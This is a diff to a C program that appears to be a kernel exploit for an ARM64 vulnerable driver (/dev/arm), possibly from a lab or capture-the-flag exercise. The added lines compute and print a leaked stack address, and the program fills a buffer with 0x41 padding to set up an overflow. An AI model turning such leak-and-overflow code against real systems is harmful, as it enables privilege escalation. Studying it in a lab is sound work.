@@ -86,6 +86,7 @@ int main(){
     unsigned long *buf = (unsigned long*)malloc(sizeof(unsigned long) * 92);
     read_write_stack messenger;
     messenger.buf = buf;
+    unsigned long stack_addr;
 
 	printf("[+] Opening device file...\n");
 	fd = open("/dev/arm", O_RDWR);
@@ -104,9 +105,11 @@ int main(){
 	}
 
 	printf("[+] x30 of outer function: 0x%lx\n", buf[66]);
+	stack_addr = buf[67] - 0x278;
+	printf("[+] Stack address: 0x%lx\n", stack_addr);
 
 	save_sp();
-	printf("[+] Stack pointer: 0x%lx\n", user_sp);
+	printf("[+] Stack pointer: 0x%016lx\n", user_sp);
 	for(int i = 0; i < 64; i++){
 		buf[i] = 0x4141414141414141;
 	}
